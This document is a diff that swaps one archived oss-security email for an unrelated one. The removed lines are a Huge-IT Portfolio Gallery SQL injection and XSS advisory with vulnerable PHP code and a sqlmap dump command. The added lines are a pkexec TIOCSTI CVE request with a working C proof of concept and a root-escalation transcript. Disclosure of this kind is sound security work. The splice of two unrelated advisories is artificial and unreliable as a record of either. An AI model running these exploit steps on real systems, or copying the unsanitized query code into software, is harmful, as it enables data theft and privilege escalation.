@@ -1,52 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/25/9
-Message-id: <5CB94822-FFC0-4948-9F78-96523639E28D@me.com>
-Date: Mon, 25 Jul 2016 10:54:07 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/25/6
+Message-ID: <20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>
+Date: Thu, 25 Feb 2016 12:15:11 +0100
+From: up201407890@...nos.dcc.fc.up.pt
+To: oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: CVE Request: pkexec tty hijacking via TIOCSTI ioctl
 Content-Type: text/plain; charset=utf-8
 
-Title: Huge-IT Portfolio Gallery manager v1.1.5 SQL Injection and XSS
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-07-15
-Download Site: http://huge-it.com/joomla-portfolio-gallery/
-Vendor: Huge IT
-Vendor Notified: 2016-07-16
-Vendor Contact: info@...e-it.com
-Description: Huge-IT Portfolio Gallery extension can do wonders with your website. If you wish to show your photos, videos, enclosing the additional images and videos, then this Portfolio Gallery extension is what you need.
-Vulnerability:
-The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability:
-
-XSS line 156 in : ./administrator/components/com_portfoliogallery/views/video/tmpl/default.php
-
-155                         <textarea rows="3" cols="50" class="text-area" disab    led >
-156                     <?php echo $_GET['edit'];?>
-157                         </textarea>
+Bug report to redhat:
+https://bugzilla.redhat.com/show_bug.cgi?id=1300746
 
 
-In file administrator/components/com_portfoliogallery/models/portfoliogallery.php:  
+When executing a program via "pkexec --user nonpriv program" the  
+nonpriv session can
+escape to the parent session by using the TIOCSTI ioctl to push  
+characters into the
+terminal's input buffer, allowing privilege escalation.
+This issue has been fixed in "su" by calling setsid() and in "sudo" by  
+using the
+"use_pty" flag.
 
-variable id is passed without any sanitization to the SQL query being built starting at line 53:
+# cat test.c
+#include <sys/ioctl.h>
 
- 50     public function getPropertie() {
- 51         $db = JFactory::getDBO();
- 52         $id_cat = JRequest::getVar('id');
- 53         $query = $db->getQuery(true);
- 54         $query->select('#__huge_itportfolio_images.name as name,'
- 55                 . '#__huge_itportfolio_images.id ,'
- 56                 . '#__huge_itportfolio_portfolios.name as portName,'
- 57                 . 'portfolio_id,#__huge_itportfolio_images.category as categ    ory, #__huge_itportfolio_images.description as description,image_url,sl_url,    sl_type,link_target,#__huge_itportfolio_images.ordering,#__huge_itportfolio_    images.published,published_in_sl_width');
- 58         $query->from(array('#__huge_itportfolio_portfolios' => '#__huge_itpo    rtfolio_portfolios', '#__huge_itportfolio_images' => '#__huge_itportfolio_im    ages'));
- 59         $query->where('#__huge_itportfolio_portfolios.id = portfolio_id')->w    here('portfolio_id=' . $id_cat);
- 60         $query->order('ordering asc');
- 61         $db->setQuery($query);
- 62         $results = $db->loadObjectList();
- 63         return $results;
+int main()
+{
+  char *cmd = "id\n";
+  while(*cmd)
+   ioctl(0, TIOCSTI, cmd++);
+}
 
-CVE-2016-1000115 XSS
-CVE-2016-1000116 SQLi
+# gcc test.c -o test
+# id saken
+uid=1000(saken) gid=1000(saken) groups=1000(saken)
 
-Exploit Code:
-	• sqlmap  --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/index.php?option=com_portfoliogallery&view=portfoliogallery&id=*" --dbms mysql --dump
-Advisory: http://www.vapidlabs.com/advisory.php?v=165
+# pkexec --user saken ./test ----> last command i type in
+id
+# id ----> did not type this
+uid=0(root) gid=0(root) groups=0(root)
+
+
+This is similar to CVE-2005-4890 and CVE-2013-6409
+
+I'd like to request a CVE for this issue.
+
+PS: I don't believe any of the previous mentions of fixes for "su" and
+"sudo" would work here, since executing a shell via pkexec would make it not
+have job control.
+
+Thanks,
+Federico Bento
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
